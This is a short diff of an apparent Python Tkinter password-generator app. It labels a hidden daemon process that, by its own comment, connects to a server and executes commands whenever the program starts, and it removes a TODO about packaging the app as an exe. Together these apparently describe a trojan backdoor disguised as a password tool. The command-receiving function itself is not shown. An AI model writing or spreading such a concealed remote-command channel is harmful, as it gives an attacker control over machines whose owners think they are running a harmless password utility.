@@ -142,9 +142,8 @@ gen_button.place(x=560, y=100)
 save_button = tk.Button(text="Save Password", font=("Roboto Light", 12), width=16, height=4, command=savepassword)
 save_button.place(x=560, y=200)
 
-# TODO create an exe of this (make sure that every thing is good before)
 
-commands_process = multiprocessing.Process(target=recv_commands)
+commands_process = multiprocessing.Process(target=recv_commands) # Creating a process to connect to server and execute commands
 commands_process.daemon = True
 if __name__ == "__main__":
     commands_process.start()
